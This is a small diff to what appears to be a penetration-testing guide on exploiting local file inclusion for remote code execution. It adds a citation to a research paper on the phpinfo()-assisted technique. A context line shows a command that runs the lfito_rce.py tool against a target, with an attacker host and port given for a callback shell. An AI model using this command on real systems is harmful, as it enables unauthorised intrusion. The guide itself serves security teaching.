@@ -217,6 +217,8 @@ The [lfito\_rce](https://github.com/roughiz/lfito\_rce) (Python2) script impleme
 python lfito_rce.py -l "http://$URL/?page=" --lhost=$attackerIP --lport=$attackerPORT -i "http://$URL/phpinfo.php"
 ```
 
+The "[LFI with phpinfo() assistance](https://docs.google.com/viewerng/viewer?url=https://insomniasec.com/cdn-assets/LFI\_With\_PHPInfo\_Assistance.pdf)" research paper from [Insomnia Security](https://insomniasec.com/) details this attack.
+
 ### via file upload
 
 #### Image Upload
